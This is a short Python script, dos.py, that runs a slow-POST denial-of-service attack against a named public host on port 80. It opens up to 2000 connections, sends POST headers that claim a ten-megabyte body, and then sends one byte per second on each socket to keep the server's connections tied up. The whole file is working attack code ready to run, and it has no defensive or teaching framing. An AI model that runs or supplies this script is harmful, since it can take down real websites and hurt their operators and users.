#!usr/bin/env python
# -*- coding:utf-8 -*-
"""
@author:linwl
@file: dos.py
@time: 2019/11/29
"""

import socket
import time
import threading

MAX_CONN = 2000
PORT = 80
HOST = "url.cn"
PAGE = "5JN7ghI"
buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 10000000\r\n"
       "Cookie: dklkt_dos_test\r\n"
       "\r\n" % (PAGE, HOST))
socks = []


def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf.encode())
            print("Send buf OK!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("Could not connect to server or send error:%s" % ex)
            time.sleep(10)


def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode())
                # print "send OK!"
            except Exception as ex:
                print("Send Exception:%s\n" % ex)
                socks.remove(s)
                s.close()
        time.sleep(1)


def start():
    # end def
    conn_th = threading.Thread(target=conn_thread, args=())
    send_th = threading.Thread(target=send_thread, args=())

    conn_th.start()
    send_th.start()


if __name__ == '__main__':
    start()
